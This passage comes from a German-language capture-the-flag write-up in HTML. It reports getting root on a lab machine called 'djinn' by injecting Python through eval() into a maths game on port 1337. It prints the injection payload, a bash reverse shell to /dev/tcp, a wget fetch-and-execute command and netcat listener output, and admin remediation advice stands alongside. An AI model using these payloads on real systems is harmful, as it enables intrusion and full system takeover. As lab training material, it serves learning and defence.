+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(7, '+', 4)
+> <span class="command">eval('__import__("os").system("whoami")')</span>
+root
+Wrong answer
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund für Privilege Escalation!** Das Spiel auf Port 1337 ist anfällig für Python Code Injection über `eval()`. Obwohl die Antwort als "Wrong answer" für das Spiel gewertet wird, wird der injizierte Code (`os.system("id")` und `os.system("whoami")`) ausgeführt, und zwar **als root**! Dies ist ein direkter Weg zur vollständigen Systemkontrolle. Der vorherige Initial Access als `www-data` und die Untersuchung des SUID-Binaries waren somit nicht der effizienteste Weg, aber Teil des Enumerationsprozesses.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die `eval()`-Injection auf Port 1337, um eine Reverse Shell als `root` zu erhalten. Erstellen Sie dazu einen Payload, der z.B. `wget` verwendet, um ein Shell-Skript herunterzuladen und auszuführen.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die Code Injection Schwachstelle im Spiel auf Port 1337. **Niemals `eval()` oder ähnliche Funktionen zur Auswertung von Benutzereingaben verwenden!** Validieren und sanitisieren Sie alle Eingaben rigoros. Deaktivieren Sie den Dienst auf Port 1337, wenn er nicht benötigt wird.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:** Vorbereitung und Ausführung des Root-Reverse-Shell-Payloads über die `eval()`-Injection.
+                1.  Ein Shell-Skript (`execute.sh`) mit einem Bash-Reverse-Shell-Payload wird auf dem Angreifer-System erstellt.
+                2.  Ein Python-HTTP-Server wird auf Port 8081 auf dem Angreifer-System gestartet, um `execute.sh` bereitzustellen.
+                3.  Ein Netcat-Listener wird auf Port 9001 auf dem Angreifer-System gestartet, um die Root-Shell zu empfangen.
+                4.  Eine Verbindung zum Spiel auf Port 1337 wird hergestellt.
+                5.  Ein komplexer Payload wird via `eval()` injiziert: `wget http://192.168.2.140:8081/execute.sh -O /tmp/execute.sh && chmod +x /tmp/execute.sh && bash /tmp/execute.sh`. Dieser lädt das Skript herunter, macht es ausführbar und führt es aus.
+            </p>
+             <!-- Terminal 1: execute.sh -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat execute.sh</span></div>
+                     <pre>
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.2.140/9001 0>&1
+                     </pre>
+                 </div>
+             </div>
+             <!-- Terminal 1: HTTP Server -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 8081</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+192.168.2.118 - - [05/Oct/2022 11:27:45] "GET /execute.sh HTTP/1.1" 200 -
+192.168.2.118 - - [05/Oct/2022 11:28:19] "GET /execute.sh HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+             <!-- Terminal 3: Netcat Listener -->
+              <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                 </div>
+             </div>
+             <!-- Terminal 2: Exploit Execution -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.118 1337</span></div>
+                     <pre>
+  ____                        _____ _
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(9, '/', 7)
+> <span class="command">eval('__import__("os").system("wget http://192.168.2.140:8081/execute.sh -O /tmp/execute.sh && chmod +x /tmp/execute.sh && bash /tmp/execute.sh")')</span>
+
+--2022-10-05 14:58:20--  http://192.168.2.140:8081/execute.sh
+Connecting to 192.168.2.140:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 57 [text/x-sh]
+Saving to: ‘/tmp/execute.sh’
+
+     0K                                                       100% 20.7M=0s
+
+2022-10-05 14:58:20 (20.7 MB/s) - ‘/tmp/execute.sh’ saved [57/57]
+                     </pre> <!-- Ausgabe von wget wird zurückgegeben -->
+                 </div>
+             </div>
+             <!-- Terminal 4: Listener empfängt Verbindung -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+DNS fwd/rev mismatch: djinn != djinn.speedport.ip
+connect to [192.168.2.140] from djinn [192.168.2.118] 51054
+bash: cannot set terminal process group (24154): Inappropriate ioctl for device
+bash: no job control in this shell
+root@djinn:/#
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Die `eval()`-Injection wurde genutzt, um das Reverse-Shell-Skript herunterzuladen und auszuführen. Da der Dienst auf Port 1337 als root lief, wurde eine Root-Shell auf dem Listener empfangen.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätigen Sie die Root-Rechte mit `id`. Lesen Sie die Root- und User-Flags.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die `eval()`-Injection-Schwachstelle im Dienst auf Port 1337. Deaktivieren Sie den Dienst oder führen Sie ihn mit minimalen Rechten aus.
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /home/nitish/user.txt</div>
+                     <div class="flag-value"><span class="password">HMV{WW91IGZvdW5kIHRoZSBmaXJzdCBzdGVw}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMV{eWVzIHlvdSBhcmUgY29vbA}</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:** Innerhalb der erhaltenen Root-Shell werden die User- und Root-Flags gelesen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">root@djinn:/# <span class="command">cd /home/;ls</span></div>
+                     <pre>
+nitish
+sam
+                     </pre>
+                     <div class="prompt" style="color: red;">root@djinn:/home# <span class="command">cat nitish/user.txt</span></div>
+                     <pre><span class="password">HMV{WW91IGZvdW5kIHRoZSBmaXJzdCBzdGVw}</span></pre>
+                     <div class="prompt" style="color: red;">root@djinn:/home# <span class="command">cd /root</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: red;">root@djinn:/root# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">HMV{eWVzIHlvdSBhcmUgY29vbA}</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags wurden erfolgreich gefunden und ausgelesen. Das Ziel der Übung wurde erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und schließen Sie den Bericht ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konzentrieren Sie sich auf die Behebung der Schwachstellen: Anonymer FTP mit Credentials, unsicherer Dienst auf Port 1337 mit `eval()`-Injection, potenzielle Schwachstelle im SUID-Binary `/usr/bin/genie` (obwohl nicht ausgenutzt).
+            </p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-10-05</p> <!-- Datum aus Nmap/Exploit -->
+    </footer>
+</body>
+</html>
